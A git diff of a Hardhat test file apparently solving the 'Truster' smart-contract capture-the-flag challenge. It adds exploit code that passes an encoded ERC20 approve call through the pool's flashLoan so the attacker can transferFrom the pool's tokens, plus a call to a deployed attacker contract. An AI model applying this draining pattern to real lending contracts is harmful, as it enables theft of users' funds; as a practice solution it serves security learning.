@@ -1,5 +1,5 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {ethers} = require('hardhat');
+const {expect} = require('chai');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -27,8 +27,35 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
+    it.skip('Exploit.v1', async function () {
+        /**
+         * This does not work, though it seems like it should!
+         **/
+        const approvePayload = this.token.interface.encodeFunctionData("approve(address,uint256)", [
+            await attacker.address, (await this.token.balanceOf(this.pool.address))
+        ])
+        let txn = await this.pool.flashLoan(0, await attacker.address, await this.token.address, approvePayload);
+        txn.wait();
+
+        txn = await this.token
+            .connect(await attacker.address)
+            .transferFrom(
+                await this.pool.address, await attacker.address, (await this.token.balanceOf(this.pool.address))
+            );
+        txn.wait(1);
+    });
+
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const attackerFactory = await ethers.getContractFactory("TrusterLenderAttacker", deployer);
+        const attackerContract = await attackerFactory.deploy();
+        let txn = await attackerContract.attack(
+            await this.token.address,
+            await this.pool.address,
+            await attacker.address
+        );
+        txn.wait(1);
+        expect(await txn.hash).to.be.not.null;
     });
 
     after(async function () {
